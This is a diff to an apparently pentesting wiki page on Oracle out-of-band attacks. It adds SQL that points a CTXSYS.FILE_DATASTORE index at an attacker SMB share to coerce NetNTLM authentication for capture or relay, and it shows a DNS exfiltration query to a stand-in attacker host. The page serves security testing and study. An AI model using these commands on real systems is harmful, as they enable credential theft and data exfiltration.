@@ -31,11 +31,17 @@ SELECT UTL_INADDR.GET_HOST_ADDRESS('<data>.<attacker-dns>') FROM dual;
 
 ## Hash capture on Windows
 
-Where Oracle runs on Windows, pointing an outbound at a **UNC path or an SMB/HTTP listener** makes the service account authenticate, handing you its NetNTLM to [capture](../../directory/active-directory/authentication/ntlm/net-ntlm-capture-and-poisoning.md) or [relay](../../directory/active-directory/authentication/ntlm/relay.md), exactly as with the MSSQL coercion primitive.
+On Windows Oracle the generic outbound packages above do **not** hand over the service account's credentials. The working coercion is a **text context index** whose datastore is a UNC path: point a `CTXSYS.FILE_DATASTORE` preference at an attacker SMB share and build an index with it, and Oracle accesses the share and authenticates, handing you the service account's NetNTLM to [capture](../../directory/active-directory/authentication/ntlm/net-ntlm-capture-and-poisoning.md) or [relay](../../directory/active-directory/authentication/ntlm/relay.md).
+
+```sql
+EXEC CTX_DDL.CREATE_PREFERENCE('p','FILE_DATASTORE');
+EXEC CTX_DDL.SET_ATTRIBUTE('p','PATH','\\<attacker>\share');
+CREATE INDEX ix ON t(c) INDEXTYPE IS CTXSYS.CONTEXT PARAMETERS('datastore p');
+```
 
 ## Exploitation notes
 
-- Since 11g the network packages are gated by **network ACLs** (`DBMS_NETWORK_ACL_ADMIN`); where they block `UTL_HTTP`/`UTL_TCP`, `DBMS_CLOUD.SEND_REQUEST` (19c/23c) often still reaches out over HTTPS.
+- Since 11g the network packages are gated by **network ACLs** (`DBMS_NETWORK_ACL_ADMIN`), so outbound needs an ACE granted for your target host. `DBMS_CLOUD.SEND_REQUEST` (19c/23c) is another outbound path, but it calls through `UTL_HTTP` and needs its own ACEs too, so it is not an ACL bypass.
 - **SSRF** from the database reaches cloud metadata endpoints and internal-only services, which is high value in cloud-hosted Oracle.
 - **Out-of-band exfiltration** (DNS or HTTP) is the way to extract data from a **blind** injection where no row is returned to you.
 - On Windows, the hash-capture angle makes Oracle an Active Directory relay source, not just a data target, so pair it with `ntlmrelayx`.
@@ -43,7 +49,8 @@ Where Oracle runs on Windows, pointing an outbound at a **UNC path or an SMB/HTT
 ## Tools
 
 - **sqlplus / injection point**: issue the `UTL_HTTP`/`UTL_TCP`/`DBMS_LDAP`/`UTL_INADDR` calls.
-- **Responder / ntlmrelayx.py**: capture or relay the coerced service-account authentication on Windows.
+- **ODAT**: automates the `CTXSYS.FILE_DATASTORE` SMB authentication capture on Windows Oracle.
+- **Responder / ntlmrelayx.py**: capture or relay the coerced service-account authentication.
 - **Burp Collaborator / interactsh**: detect the out-of-band HTTP and DNS interactions.
 
 ## References
